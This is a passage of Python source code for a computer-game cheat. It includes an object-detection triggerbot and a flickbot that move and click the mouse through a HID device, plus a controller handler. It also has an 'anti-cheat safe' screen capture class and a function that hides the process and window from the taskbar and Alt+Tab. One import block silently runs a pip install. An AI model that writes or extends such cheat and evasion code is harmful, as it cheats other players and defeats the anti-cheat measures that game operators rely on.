        return min(targets, key=lambda t: t['distance'])
    
    def is_target_locked(self, target_x, target_y, fov_center):
        """Check if target is close enough to crosshair"""
        # Calculate distance from crosshair to target
        distance = math.sqrt((target_x - fov_center) ** 2 + (target_y - fov_center) ** 2)
        # Consider locked if within 20 pixels (increased for easier triggering)
        return distance < 20
    
    def should_fire(self):
        """Check if all conditions are met to fire"""
        if not self.enabled:
            return False
        
        # In spray mode, we're less strict about being "ready"
        if self.spray_mode and self.spray_active:
            return True
        
        if not self.is_ready_to_fire():
            return False
        
        # Check triggerbot keybind
        if not self.is_keybind_pressed():
            return False
        
        # Optionally also require main aimbot key
        if self.require_aimbot_key:
            aimbot_key = int(self.aimbot_controller.keybind, 16)
            if win32api.GetAsyncKeyState(aimbot_key) not in (-127, -128):
                return False
        
        return True
    
    def perform_trigger_with_results(self, results):
        """Perform triggerbot using provided YOLO results - FAST SPRAY VERSION"""
        if not self.enabled:
            return False
        
        if not self.is_keybind_pressed():
            # Key released - stop spraying
            if self.spray_active:
                self.stop_spray()
            return False
        
        # Find best target from results
        target = self.find_best_target_from_results(results)
        
        if not target:
            # No target - stop spraying if active
            if self.spray_active:
                self.stop_spray()
            return False
        
        # Check if target is close enough to crosshair
        fov_center = self.aimbot_controller.fov // 2
        target_x, target_y = target['position']
        
        if self.is_target_locked(target_x, target_y, fov_center):
            # Target locked - start or continue spraying
            if not self.spray_active:
                self.start_spray()
            
            # Check if we should fire based on spray rate
            if self.is_ready_to_fire():
                # Check spray duration limit
                if time.time() - self.spray_start_time > self.max_spray_duration:
                    # Reset spray after max duration
                    self.stop_spray()
                    self.start_spray()
                
                # Fire continuously
                success = self.execute_fast_fire()
                
                if success:
                    self.last_fire_time = time.time()
                
                return success
        else:
            # Target not locked - stop spraying
            if self.spray_active:
                self.stop_spray()
        
        return False
    
    def start_spray(self):
        """Start spray mode"""
        self.spray_active = True
        self.spray_start_time = time.time()
        # Simulate mouse button down for continuous fire
        if ensure_mouse_connected():
            try:
                # Send mouse down event
                mouse_dev.write([1, 0x01, 0, 0, 0, 0])  # Left button down
            except:
                pass
    
    def stop_spray(self):
        """Stop spray mode"""
        self.spray_active = False
        # Release mouse button
        if ensure_mouse_connected():
            try:
                # Send mouse up event
                mouse_dev.write([1, 0x00, 0, 0, 0, 0])  # Left button up
            except:
                pass
    
    def execute_fast_fire(self):
        """Execute fast firing for spray mode"""
        global mouse_dev
        
        if not mouse_dev:
            return False
        
        try:
            if self.spray_mode and self.spray_active:
                # In spray mode, we simulate holding the button
                # Just send a click pulse to maintain the spray
                mouse_dev.write([1, 0x00, 0, 0, 0, 0])  # Quick release
                time.sleep(0.0001)  # 0.1ms delay
                mouse_dev.write([1, 0x01, 0, 0, 0, 0])  # Press again
                return True
            else:
                # Normal single shot mode (fallback)
                return self.execute_fire()
                
        except Exception as e:
            return False
    
    def execute_fire(self):
        """Execute the fire action - FAST VERSION"""
        if not ensure_mouse_connected():
            self.consecutive_failures += 1
            return False
        
        try:
            # NO DELAY for maximum speed
            
            # Fire based on mode
            if self.rapid_fire and self.shots_per_burst > 1:
                # Ultra-fast rapid fire mode
                for _ in range(self.shots_per_burst):
                    mouse_dev.write([1, 0x01, 0, 0, 0, 0])  # Button down
                    # No sleep - instant release
                    mouse_dev.write([1, 0x00, 0, 0, 0, 0])  # Button up
                
                self.consecutive_failures = 0
                return True
            else:
                # Single shot mode - but very fast
                mouse_dev.write([1, 0x01, 0, 0, 0, 0])  # Button down
                # Minimal hold time
                time.sleep(0.001)  # 1ms hold
                mouse_dev.write([1, 0x00, 0, 0, 0, 0])  # Button up
                
                self.consecutive_failures = 0
                return True
                    
        except Exception as e:
            print(f"[-] Triggerbot fire error: {e}")
            self.consecutive_failures += 1
            return False
    
    def fire(self):
        """Legacy fire method for compatibility - ULTRA FAST VERSION"""
        # NO READY CHECK - FIRE IMMEDIATELY
        
        # Execute immediately without thread for fastest response
        try:
            # Ensure mouse is connected
            if not ensure_mouse_connected():
                self.consecutive_failures += 1
                return
            
            # NO DELAY - INSTANT FIRE
            
            # Fire based on mode
            if self.rapid_fire and self.shots_per_burst > 1:
                # Ultra rapid fire mode
                for _ in range(self.shots_per_burst):
                    mouse_dev.write([1, 0x01, 0, 0, 0, 0])  # Button down
                    mouse_dev.write([1, 0x00, 0, 0, 0, 0])  # Button up
                    
                self.last_fire_time = time.time()
                self.consecutive_failures = 0
            else:
                # Single shot mode but very fast
                mouse_dev.write([1, 0x01, 0, 0, 0, 0])  # Button down
                time.sleep(0.001)  # 1ms
                mouse_dev.write([1, 0x00, 0, 0, 0, 0])  # Button up
                
                self.last_fire_time = time.time()
                self.consecutive_failures = 0
                    
        except Exception as e:
            print(f"[-] Triggerbot fire error: {e}")
            self.consecutive_failures += 1

class Flickbot:
    """Enhanced Flickbot with proper screen movement and aim height targeting"""
    
    def __init__(self, aimbot_controller):
        self.aimbot_controller = aimbot_controller
        self.enabled = False
        
        # Flick settings
        self.flick_speed = 1.0  # Direct movement multiplier
        self.flick_delay = 0.01  # Minimal delay before fire
        self.cooldown = 0.3  # Cooldown between flicks
        self.last_flick_time = 0
        self.keybind = 0x05  # Mouse button 4
        
        # Behavior settings
        self.auto_fire = True
        self.return_to_origin = True
        self.smooth_flick = False
        self.instant_flick = True  # Instant movement
        
        # State tracking
        self.consecutive_failures = 0
        self.flick_in_progress = False
        
    def is_ready_to_flick(self):
        """Check if flickbot is ready to flick"""
        return time.time() - self.last_flick_time > self.cooldown and not self.flick_in_progress
    
    def is_keybind_pressed(self):
        """Check if flickbot keybind is pressed"""
        return win32api.GetAsyncKeyState(self.keybind) < 0
    
    def find_best_target_from_results(self, results):
        """Find best target from YOLO results using aim height offset"""
        if not results or len(results[0].boxes) == 0:
            return None
        
        targets = []
        fov_center = self.aimbot_controller.fov // 2
        
        for box in results[0].boxes:
            x1, y1, x2, y2 = box.xyxy[0]
            
            # Convert tensors if needed
            if hasattr(x1, 'item'):
                x1, y1, x2, y2 = x1.item(), y1.item(), x2.item(), y2.item()
            
            # Calculate dimensions
            height = y2 - y1
            width = x2 - x1
            
            # Skip tiny detections
            if width < 5 or height < 5:
                continue
            
            # IMPORTANT: Use the SAME aim calculation as main aimbot
            # This targets the specific body part based on aim_height setting
            center_x = (x1 + x2) / 2
            target_y = y1 + (height * (100 - self.aimbot_controller.aim_height) / 100)
            
            # Store FOV coordinates (these are relative to the FOV window)
            fov_target_x = center_x
            fov_target_y = target_y
            
            # Calculate distance from FOV center for prioritization
            dist_from_center = math.sqrt((fov_target_x - fov_center) ** 2 + (fov_target_y - fov_center) ** 2)
            
            # Get confidence
            confidence = box.conf[0].cpu().numpy() if hasattr(box.conf[0], 'cpu') else box.conf[0]
            
            targets.append({
                'fov_position': (fov_target_x, fov_target_y),  # Position in FOV coordinates
                'distance': dist_from_center,
                'confidence': confidence,
                'box': (x1, y1, x2, y2)
            })
        
        if not targets:
            return None
        
        # Return closest target to center
        return min(targets, key=lambda t: t['distance'])
    
    def calculate_flick_movement(self, fov_target_x, fov_target_y):
        """Calculate the exact mouse movement needed to flick to target"""
        # Get screen dimensions and FOV offset
        screen_center_x = self.aimbot_controller.center_x
        screen_center_y = self.aimbot_controller.center_y
        fov_size = self.aimbot_controller.fov
        
        # Calculate where the FOV window is on the screen
        fov_left = screen_center_x - (fov_size // 2)
        fov_top = screen_center_y - (fov_size // 2)
        
        # Convert FOV coordinates to absolute screen coordinates
        absolute_target_x = fov_left + fov_target_x
        absolute_target_y = fov_top + fov_target_y
        
        # Calculate movement needed from screen center to target
        delta_x = absolute_target_x - screen_center_x
        delta_y = absolute_target_y - screen_center_y
        
        # Apply sensitivity from aimbot settings
        delta_x *= self.aimbot_controller.sensitivity
        delta_y *= self.aimbot_controller.sensitivity
        
        # Apply flick speed multiplier
        delta_x *= self.flick_speed
        delta_y *= self.flick_speed
        
        # Convert to integers and clamp
        delta_x = int(round(delta_x))
        delta_y = int(round(delta_y))
        
        # Clamp to prevent overflow
        delta_x = max(-127, min(127, delta_x))
        delta_y = max(-127, min(127, delta_y))
        
        return delta_x, delta_y
    
    def execute_flick(self, target):
        """Execute the flick movement to target"""
        if not ensure_mouse_connected():
            self.consecutive_failures += 1
            return False
        
        try:
            # Get FOV position from target
            fov_x, fov_y = target['fov_position']
            
            # Calculate the actual mouse movement needed
            delta_x, delta_y = self.calculate_flick_movement(fov_x, fov_y)
            
            # Debug print to see movement values
            # print(f"[Flick] Target at FOV ({fov_x:.0f}, {fov_y:.0f}) -> Move ({delta_x}, {delta_y})")
            
            if self.instant_flick:
                # INSTANT FLICK - Like ColorBot silent aim
                # Move to target instantly
                move_mouse(delta_x, delta_y)
                
                # Minimal delay
                time.sleep(self.flick_delay)
                
                # Fire
                if self.auto_fire:
                    click_mouse('left', duration=0.01)
                
                # Return instantly
                if self.return_to_origin:
                    move_mouse(-delta_x, -delta_y)
                    
            else:
                # SMOOTH FLICK - Original behavior
                if self.smooth_flick:
                    # Smooth movement in steps
                    steps = 3
                    for i in range(steps):
                        move_mouse(delta_x // steps, delta_y // steps)
                        time.sleep(0.002)
                else:
                    # Single movement
                    move_mouse(delta_x, delta_y)
                
                # Delay before fire
                time.sleep(self.flick_delay)
                
                # Fire
                if self.auto_fire:
                    click_mouse('left', duration=0.02)
                
                # Return to origin
                if self.return_to_origin:
                    time.sleep(0.01)
                    if self.smooth_flick:
                        for i in range(steps):
                            move_mouse(-delta_x // steps, -delta_y // steps)
                            time.sleep(0.002)
                    else:
                        move_mouse(-delta_x, -delta_y)
            
            self.consecutive_failures = 0
            return True
            
        except Exception as e:
            print(f"[-] Flick execution error: {e}")
            self.consecutive_failures += 1
            return False
    
    def perform_flick_with_results(self, results):
        """Perform flick using provided YOLO results"""
        if not self.enabled or not self.is_ready_to_flick():
            return False
        
        if not self.is_keybind_pressed():
            return False
        
        # Check for failures
        if self.consecutive_failures > 5:
            print("[-] Flickbot disabled due to repeated failures")
            self.enabled = False
            self.consecutive_failures = 0
            return False
        
        self.flick_in_progress = True
        
        try:
            # Find best target from results
            target = self.find_best_target_from_results(results)
            
            if not target:
                return False
            
            # Execute flick to the target
            success = self.execute_flick(target)
            
            if success:
                self.last_flick_time = time.time()
            
            return success
            
        finally:
            self.flick_in_progress = False

# Silent import flags
CONTROLLER_MESSAGES_SHOWN = False
VGAMEPAD_AVAILABLE = False
XINPUT_AVAILABLE = False

# Silently try to import vgamepad
try:
    import vgamepad as vg
    VGAMEPAD_AVAILABLE = True
except Exception as e:
    vg = None  # Set to None so we can check later

# Silently try to import XInput
try:
    import XInput
    XINPUT_AVAILABLE = True
except ImportError:
    try:
        # Silently install if not available
        import subprocess
        subprocess.run([sys.executable, "-m", "pip", "install", "XInput-Python"], 
                      capture_output=True, text=True)
        import XInput
        XINPUT_AVAILABLE = True
    except:
        XInput = None

class ControllerHandler:
    """Universal controller handler using vgamepad for virtual controller output"""
    
    def __init__(self, aimbot_controller):
        self.aimbot_controller = aimbot_controller
        self.enabled = False
        self.running = False
        self.thread = None
        
        # Physical controller input
        self.physical_controller_index = None
        self.physical_controller_connected = False
        
        # Virtual controller output
        self.virtual_gamepad = None
        self.virtual_controller_initialized = False
        self.vgamepad_available = VGAMEPAD_AVAILABLE
        
        # Controller settings
        self.deadzone = 0.15
        self.aim_stick = "right"
        self.trigger_threshold = 0.5
        self.sensitivity_multiplier = 1.0
        self.activation_button = "right_trigger"
        self.hold_to_aim = True
        
        # Controller type detection
        self.controller_type = "xbox"
        
        # State tracking
        self.is_aiming = False
        self.last_aim_state = False
        self.last_button_states = {}
        
        # Silent mode flag
        self.silent_mode = True
        self.messages_shown = False
        
        # Don't initialize virtual controller on startup - wait until needed
        self.virtual_controller_attempted = False

    def show_controller_messages(self):
        """Show controller status messages only when needed"""
        global CONTROLLER_MESSAGES_SHOWN
        
        if not CONTROLLER_MESSAGES_SHOWN:
            CONTROLLER_MESSAGES_SHOWN = True
            
            # Only show messages when controller functionality is actually accessed
            if not VGAMEPAD_AVAILABLE:
                print("\n" + "="*60)
                print("[!] Virtual controller features disabled")
                print("[!] To enable virtual controller support:")
                print("    1. Download: https://github.com/ViGEm/ViGEmBus/releases")
                print("    2. Install ViGEmBusSetup_x64.msi")
                print("    3. Restart your computer")
                print("="*60 + "\n")
            else:
                print("[+] Virtual controller support available")
            
            if XINPUT_AVAILABLE:
                print("[+] XInput controller support ready")
            else:
                print("[-] XInput not available - controller input disabled")
        
    def initialize_virtual_controller(self):
        """Initialize vgamepad virtual controller only when needed"""
        if self.virtual_controller_attempted:
            return self.virtual_controller_initialized
            
        self.virtual_controller_attempted = True
        
        if not VGAMEPAD_AVAILABLE or vg is None:
            # Silently fail - messages shown elsewhere if needed
            self.virtual_controller_initialized = False
            return False
            
        try:
            self.virtual_gamepad = vg.VX360Gamepad()
            self.virtual_controller_initialized = True
            if not self.silent_mode:
                print("[+] Virtual controller initialized")
            return True
        except Exception as e:
            self.virtual_controller_initialized = False
            return False
    
    def find_controller(self):
        """Find and connect to a physical controller"""
        if not XINPUT_AVAILABLE or XInput is None:
            # Only show message if user is actively trying to use controller
            if not self.silent_mode and not self.messages_shown:
                print("[-] XInput not available - cannot detect controllers")
                self.messages_shown = True
            return False
            
        try:
            for i in range(4):
                state = XInput.State()
                result = XInput.XInputGetState(i, state)
                
                if result == 0:  # ERROR_SUCCESS
                    self.physical_controller_index = i
                    self.physical_controller_connected = True
                    self.controller_type = "xbox"
                    
                    # Only show connection message if not in silent mode
                    if not self.silent_mode:
                        print(f"[+] Controller connected (Index: {i})")
                        
                        # Try to initialize virtual controller when physical controller is found
                        if not self.virtual_controller_initialized and VGAMEPAD_AVAILABLE:
                            self.initialize_virtual_controller()
                    
                    return True
            
            # Controller disconnected
            if self.physical_controller_connected:
                if not self.silent_mode:
                    print("[-] Controller disconnected")
                self.physical_controller_connected = False
                self.physical_controller_index = None
                
            return False
            
        except Exception as e:
            if not self.silent_mode:
                print(f"[-] Controller detection error: {e}")
            return False
    
    def detect_controller_type(self, controller_name=""):
        """Detect controller type - for compatibility"""
        # With XInput, we primarily support Xbox-style controllers
        # PS4/PS5 controllers need DS4Windows or similar to work
        return "xbox"
    
    def get_physical_controller_state(self):
        """Get the current state of the physical controller"""
        if not self.physical_controller_connected or self.physical_controller_index is None:
            return None
            
        try:
            state = XInput.State()
            result = XInput.XInputGetState(self.physical_controller_index, state)
            
            if result == 0:  # ERROR_SUCCESS
                return state.gamepad
            else:
                # Controller disconnected
                self.physical_controller_connected = False
                return None
                
        except Exception as e:
            print(f"[-] Error reading controller state: {e}")
            return None
    
    def get_stick_input(self, stick="right"):
        """Get analog stick input from physical controller"""
        if not self.physical_controller_connected:
            return 0, 0
        
        gamepad = self.get_physical_controller_state()
        if not gamepad:
            return 0, 0
        
        try:
            if stick == "right":
                x = gamepad.right_thumb_x / 32768.0
                y = -gamepad.right_thumb_y / 32768.0  # Invert Y axis
            else:
                x = gamepad.left_thumb_x / 32768.0
                y = -gamepad.left_thumb_y / 32768.0  # Invert Y axis
            
            # Apply deadzone
            magnitude = math.sqrt(x*x + y*y)
            if magnitude < self.deadzone:
                return 0, 0
            
            # Normalize
            if magnitude > 1.0:
                magnitude = 1.0
            
            normalized_magnitude = (magnitude - self.deadzone) / (1.0 - self.deadzone)
            x = (x / magnitude) * normalized_magnitude if magnitude > 0 else 0
            y = (y / magnitude) * normalized_magnitude if magnitude > 0 else 0
            
            return x, y
            
        except Exception:
            return 0, 0
    
    def get_trigger_input(self, trigger="right"):
        """Get trigger input from physical controller"""
        if not self.physical_controller_connected:
            return 0
        
        gamepad = self.get_physical_controller_state()
        if not gamepad:
            return 0
        
        try:
            if trigger == "right":
                return gamepad.right_trigger / 255.0
            else:
                return gamepad.left_trigger / 255.0
        except Exception:
            return 0
    
    def is_button_pressed(self, button):
        """Check if a button is pressed on physical controller"""
        if not self.physical_controller_connected:
            return False
        
        gamepad = self.get_physical_controller_state()
        if not gamepad:
            return False
        
        try:
            button_map = {
                'a': 0x1000,  # XINPUT_GAMEPAD_A
                'b': 0x2000,  # XINPUT_GAMEPAD_B
                'x': 0x4000,  # XINPUT_GAMEPAD_X
                'y': 0x8000,  # XINPUT_GAMEPAD_Y
                'lb': 0x0100,  # XINPUT_GAMEPAD_LEFT_SHOULDER
                'rb': 0x0200,  # XINPUT_GAMEPAD_RIGHT_SHOULDER
                'back': 0x0020,  # XINPUT_GAMEPAD_BACK
                'start': 0x0010,  # XINPUT_GAMEPAD_START
                'ls': 0x0040,  # XINPUT_GAMEPAD_LEFT_THUMB
                'rs': 0x0080,  # XINPUT_GAMEPAD_RIGHT_THUMB
                'up': 0x0001,  # XINPUT_GAMEPAD_DPAD_UP
                'down': 0x0002,  # XINPUT_GAMEPAD_DPAD_DOWN
                'left': 0x0004,  # XINPUT_GAMEPAD_DPAD_LEFT
                'right': 0x0008,  # XINPUT_GAMEPAD_DPAD_RIGHT
            }
            
            if isinstance(button, str):
                button_flag = button_map.get(button.lower(), 0)
            else:
                button_flag = button
            
            return bool(gamepad.buttons & button_flag)
            
        except Exception:
            return False
    
    def send_virtual_input(self, stick_x=0, stick_y=0, trigger_value=0):
        """Send input through virtual controller if available"""
        if not self.virtual_controller_initialized or not self.virtual_gamepad:
            # Silently skip if virtual controller not available
            return
        
        try:
            # Update virtual controller state
            if self.aim_stick == "right":
                self.virtual_gamepad.right_joystick(
                    x_value=int(stick_x * 32767),
                    y_value=int(stick_y * 32767)
                )
            else:
                self.virtual_gamepad.left_joystick(
                    x_value=int(stick_x * 32767),
                    y_value=int(stick_y * 32767)
                )
            
            # Set trigger if needed
            if trigger_value > 0:
                if self.activation_button == "right_trigger":
                    self.virtual_gamepad.right_trigger(value=int(trigger_value * 255))
                elif self.activation_button == "left_trigger":
                    self.virtual_gamepad.left_trigger(value=int(trigger_value * 255))
            
            # Update the virtual controller
            self.virtual_gamepad.update()
            
        except Exception as e:
            # Silently fail if virtual controller has issues
            pass
    
    def check_activation(self):
        """Check if aimbot should be activated based on controller input"""
        if not self.physical_controller_connected or not self.enabled:
            return False
        
        # Check based on activation button setting
        if self.activation_button == "right_trigger":
            return self.get_trigger_input("right") > self.trigger_threshold
        elif self.activation_button == "left_trigger":
            return self.get_trigger_input("left") > self.trigger_threshold
        elif self.activation_button == "right_bumper":
            return self.is_button_pressed("rb")
        elif self.activation_button == "left_bumper":
            return self.is_button_pressed("lb")
        elif self.activation_button == "right_stick":
            return self.is_button_pressed("rs")
        elif self.activation_button == "a_button":
            return self.is_button_pressed("a")
        elif self.activation_button == "x_button":
            return self.is_button_pressed("x")
        
        return False
    
    def controller_loop(self):
        """Main controller loop"""
        last_controller_check = 0
        controller_check_interval = 2.0
        
        while self.running:
            try:
                # Check for controller only if enabled
                if self.enabled:
                    current_time = time.time()
                    if not self.physical_controller_connected and current_time - last_controller_check > controller_check_interval:
                        # Silent check when just polling
                        old_silent = self.silent_mode
                        self.silent_mode = True
                        self.find_controller()
                        self.silent_mode = old_silent
                        last_controller_check = current_time
                    
                    if self.physical_controller_connected:
                        # Process controller input...
                        self.is_aiming = self.check_activation()
                        
                        if self.is_aiming != self.last_aim_state:
                            if self.is_aiming:
                                if not self.silent_mode:
                                    print("[Controller] Aimbot activated")
                            self.last_aim_state = self.is_aiming
                        
                        # Process other controller functions...
                        if self.is_aiming:
                            stick_x, stick_y = self.get_stick_input(self.aim_stick)
                            if abs(stick_x) > 0.1 or abs(stick_y) > 0.1:
                                move_x = stick_x * 15 * self.sensitivity_multiplier
                                move_y = stick_y * 15 * self.sensitivity_multiplier
                                if self.aimbot_controller.mouse_method.lower() == "hid":
                                    move_mouse(int(move_x), int(move_y))
                        
                        self.process_button_actions()
                
                time.sleep(0.01)
                
            except Exception as e:
                if not self.silent_mode:
                    print(f"[-] Controller loop error: {e}")
                time.sleep(0.1)
    
    def process_button_actions(self):
        """Process button mappings for quick actions"""
        config = self.aimbot_controller.config_manager.get_config()
        mappings = config.get('controller', {}).get('button_mappings', {})
        
        # Track button states to detect press/release
        current_states = {
            'y': self.is_button_pressed('y'),
            'x': self.is_button_pressed('x'),
            'b': self.is_button_pressed('b'),
            'combo': self.is_button_pressed('back') and self.is_button_pressed('start')
        }
        
        # Y button action
        if current_states['y'] and not self.last_button_states.get('y', False):
            action = mappings.get('y_action', 'None')
            self.execute_action(action)
        
        # X button action
        if current_states['x'] and not self.last_button_states.get('x', False):
            action = mappings.get('x_action', 'None')
            self.execute_action(action)
        
        # B button action
        if current_states['b'] and not self.last_button_states.get('b', False):
            action = mappings.get('b_action', 'None')
            self.execute_action(action)
        
        # Back + Start combo
        if current_states['combo'] and not self.last_button_states.get('combo', False):
            action = mappings.get('combo_action', 'None')
            self.execute_action(action)
        
        # Update last states
        self.last_button_states = current_states
    
    def execute_action(self, action):
        """Execute a mapped action"""
        if action == "Toggle Overlay":
            current = self.aimbot_controller.config_manager.get_value('show_overlay', True)
            self.aimbot_controller.config_manager.set_value('show_overlay', not current)
            print(f"[Controller] Overlay {'enabled' if not current else 'disabled'}")
            
        elif action == "Toggle Debug Window":
            self.aimbot_controller.toggle_debug_window()
            
        elif action == "Toggle Triggerbot":
            current = self.aimbot_controller.triggerbot.enabled
            self.aimbot_controller.triggerbot.enabled = not current
            print(f"[Controller] Triggerbot {'enabled' if not current else 'disabled'}")
            
        elif action == "Toggle Flickbot":
            current = self.aimbot_controller.flickbot.enabled
            self.aimbot_controller.flickbot.enabled = not current
            print(f"[Controller] Flickbot {'enabled' if not current else 'disabled'}")
            
        elif action == "Emergency Stop":
            self.aimbot_controller.force_stop()
            
        elif action == "Toggle Movement Curves":
            self.aimbot_controller.toggle_movement_curves()
            
        elif action == "Switch Overlay Shape":
            self.aimbot_controller.toggle_overlay_shape()
            
        elif action == "Toggle Aimbot":
            if self.aimbot_controller.running:
                self.aimbot_controller.stop()
            else:
                self.aimbot_controller.start()
                
        elif action == "Increase Sensitivity":
            current = self.aimbot_controller.sensitivity
            new_sens = min(10.0, current + 0.1)
            self.aimbot_controller.config_manager.set_value('sensitivity', new_sens)
            print(f"[Controller] Sensitivity: {new_sens:.1f}")
            
        elif action == "Decrease Sensitivity":
            current = self.aimbot_controller.sensitivity
            new_sens = max(0.1, current - 0.1)
            self.aimbot_controller.config_manager.set_value('sensitivity', new_sens)
            print(f"[Controller] Sensitivity: {new_sens:.1f}")
    
    def vibrate(self, left_motor=0.5, right_motor=0.5, duration=0.1):
        """Trigger controller vibration using XInput"""
        if self.physical_controller_connected and self.physical_controller_index is not None:
            try:
                # Create vibration structure
                vibration = XInput.XINPUT_VIBRATION()
                vibration.wLeftMotorSpeed = int(left_motor * 65535)
                vibration.wRightMotorSpeed = int(right_motor * 65535)
                
                # Set vibration
                XInput.XInputSetState(self.physical_controller_index, vibration)
                
                # Stop vibration after duration
                def stop_vibration():
                    stop_vib = XInput.XINPUT_VIBRATION()
                    stop_vib.wLeftMotorSpeed = 0
                    stop_vib.wRightMotorSpeed = 0
                    XInput.XInputSetState(self.physical_controller_index, stop_vib)
                
                threading.Timer(duration, stop_vibration).start()
            except Exception as e:
                pass  # Silently fail if vibration not supported
    
    def stop(self):
        """Stop controller support"""
        self.running = False
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=1)
        
        # Clean up virtual controller
        if self.virtual_gamepad:
            try:
                # Reset virtual controller to neutral position
                self.virtual_gamepad.reset()
                self.virtual_gamepad.update()
            except:
                pass
        
        # Stop any vibration
        if self.physical_controller_connected and self.physical_controller_index is not None:
            try:
                stop_vib = XInput.XINPUT_VIBRATION()
                stop_vib.wLeftMotorSpeed = 0
                stop_vib.wRightMotorSpeed = 0
                XInput.XInputSetState(self.physical_controller_index, stop_vib)
            except:
                pass
        
        print("[+] Controller support stopped")
    
    def start(self):
        """Start controller support"""
        if not self.running:
            # Check if we should show messages (only when actually starting)
            if self.enabled and not self.messages_shown:
                self.silent_mode = False  # Disable silent mode when actively using
                self.show_controller_messages()
                
            self.running = True
            self.thread = threading.Thread(target=self.controller_loop, daemon=True)
            self.thread.start()
            
            # Only show this if controller is enabled
            if self.enabled and not self.silent_mode:
                print("[+] Controller support started")
            return True
        return False

    def check_vgamepad_requirements():
        """Check if vgamepad requirements are met"""
        try:
            import vgamepad as vg
            # Try to create a test controller
            test_controller = vg.VX360Gamepad()
            test_controller.reset()
            test_controller.update()
            print("[+] vgamepad is working correctly")
            return True
        except Exception as e:
            if "VIGEM_ERROR_BUS_NOT_FOUND" in str(e):
                print("\n" + "="*60)
                print("[-] ViGEmBus driver not installed!")
                print("[!] Virtual controller features will be disabled")
                print("[!] To enable virtual controller support:")
                print("    1. Download: https://github.com/ViGEm/ViGEmBus/releases")
                print("    2. Install ViGEmBusSetup_x64.msi")
                print("    3. Restart your computer")
                print("="*60 + "\n")
            else:
                print(f"[-] vgamepad error: {e}")
            return False

import os
from PyQt6.QtGui import QIcon, QPixmap
from PyQt6.QtCore import Qt, QSize
from PyQt6.QtWidgets import QLabel

from PyQt6.QtWidgets import QSlider, QComboBox, QSpinBox, QDoubleSpinBox, QScrollArea
from PyQt6.QtCore import Qt, QEvent, QObject

class NoScrollSlider(QSlider):
    """Custom QSlider that ignores wheel events"""
    def wheelEvent(self, event):
        event.ignore()

class NoScrollComboBox(QComboBox):
    """Custom QComboBox that ignores wheel events"""
    def wheelEvent(self, event):
        # Always ignore wheel events for combo boxes
        event.ignore()

class NoScrollSpinBox(QSpinBox):
    """Custom QSpinBox that ignores wheel events"""
    def wheelEvent(self, event):
        event.ignore()

class NoScrollDoubleSpinBox(QDoubleSpinBox):
    """Custom QDoubleSpinBox that ignores wheel events"""
    def wheelEvent(self, event):
        event.ignore()

class IconManager:
    """Manages custom icons for the GUI"""
    
    def __init__(self, icon_path="icons"):
        """
        Initialize icon manager with path to icons folder
        
        Args:
            icon_path: Path to folder containing icon images
        """
        self.icon_path = icon_path
        self.icons = {}
        self.load_icons()
    
    def load_icons(self):
        """Load all icons from the icons folder"""
        # Define icon mappings (filename without extension : key)
        icon_files = {
            # Navigation icons
            'general': 'general.png',
            'target': 'target1.png',
            'display': 'monitor.png',
            'performance': 'chart.png',
            'models': 'robot.png',
            'advanced': 'settings.png',
            'rcs': 'target.png',
            'triggerbot': 'gun.png',
            'flickbot': 'explosion.png',
            'controller': 'gamepad.png',
            'hotkeys': 'keyboard.png',
            'about': 'info.png',

            #Keybind icons
            'mouse_left': 'mouse_left.png',
            'mouse_right': 'mouse_right.png',
            'mouse_4': 'mouse_4.png',
            'mouse_5': 'mouse_5.png',
            'mouse_scroll': 'mouse_scroll.png',
            'left_shift': 'left_shift.png',
            'tab_key': 'tab_key.png',
            'left_ctrl': 'left_ctrl.png',
            'left_alt': 'left_alt.png',
        }
        
        for key, filename in icon_files.items():
            filepath = os.path.join(self.icon_path, filename)
            if os.path.exists(filepath):
                self.icons[key] = QPixmap(filepath)
            else:
                print(f"Warning: Icon not found: {filepath}")
    
    def get_icon(self, key, size=None):
        """
        Get icon by key
        
        Args:
            key: Icon identifier
            size: Tuple (width, height) or QSize object
        
        Returns:
            QIcon object or None if not found
        """
        if key in self.icons:
            pixmap = self.icons[key]
            if size:
                if isinstance(size, tuple):
                    pixmap = pixmap.scaled(size[0], size[1], 
                                         Qt.AspectRatioMode.KeepAspectRatio, 
                                         Qt.TransformationMode.SmoothTransformation)
                elif isinstance(size, QSize):
                    pixmap = pixmap.scaled(size, 
                                         Qt.AspectRatioMode.KeepAspectRatio,
                                         Qt.TransformationMode.SmoothTransformation)
            return QIcon(pixmap)
        return None
    
    def get_pixmap(self, key, size=None):
        """
        Get pixmap by key
        
        Args:
            key: Icon identifier
            size: Tuple (width, height) or QSize object
        
        Returns:
            QPixmap object or None if not found
        """
        if key in self.icons:
            pixmap = self.icons[key]
            if size:
                if isinstance(size, tuple):
                    pixmap = pixmap.scaled(size[0], size[1], 
                                         Qt.AspectRatioMode.KeepAspectRatio,
                                         Qt.TransformationMode.SmoothTransformation)
                elif isinstance(size, QSize):
                    pixmap = pixmap.scaled(size, 
                                         Qt.AspectRatioMode.KeepAspectRatio,
                                         Qt.TransformationMode.SmoothTransformation)
            return pixmap
        return None
    
    def create_icon_label(self, key, size=(16, 16)):
        """
        Create a QLabel with an icon
        
        Args:
            key: Icon identifier
            size: Tuple (width, height)
        
        Returns:
            QLabel with icon or empty QLabel if not found
        """
        label = QLabel()
        pixmap = self.get_pixmap(key, size)
        if pixmap:
            label.setPixmap(pixmap)
        label.setFixedSize(size[0], size[1])
        return label

# ============================================
# INTEGRATION WITH YOUR GUI
# ============================================
def integrate_with_pyqt(window):
    """Integrate hiding features with PyQt window"""
    
    # Get window handle
    hwnd = int(window.winId())
    
    # Create process hider
    hider = ProcessHider()
    
    # Hide from taskbar
    hider.hide_from_taskbar(hwnd)
    
    # Apply process hiding
    hider.hide_process()
    
    # Make window stay on top but hidden from Alt+Tab
    window.setWindowFlags(
        window.windowFlags() | 
        Qt.WindowType.WindowStaysOnTopHint |
        Qt.WindowType.Tool
    )
    
    return hider

class StealthCapture:
    """Anti-cheat safe capture system with GPU acceleration"""
    
    def __init__(self, fov=320, left=0, top=0):
        self.fov = fov
        self.left = left
        self.top = top
        self.running = False
        self.gpu_code = self._get_gpu_code()
        self.last_frame_hash = None
        self.gpu_buffer = None
        self.gpu_initialized = False
        
        # Initialize bettercam
        self.cam = bettercam.create(device_idx=0, output_color="BGR", nvidia_gpu=False)
        self.cam.start(target_fps=0)
        
        print(f"[+] Anti-cheat safe capture initialized - {self.gpu_code}")
    
    def _get_gpu_code(self):
        """Get GPU identifier"""
        try:
            props = cp.cuda.runtime.getDeviceProperties(0)
            full_name = props['name'].decode('utf-8')
            clean_name = full_name.replace("NVIDIA ", "").replace("GeForce ", "")
            
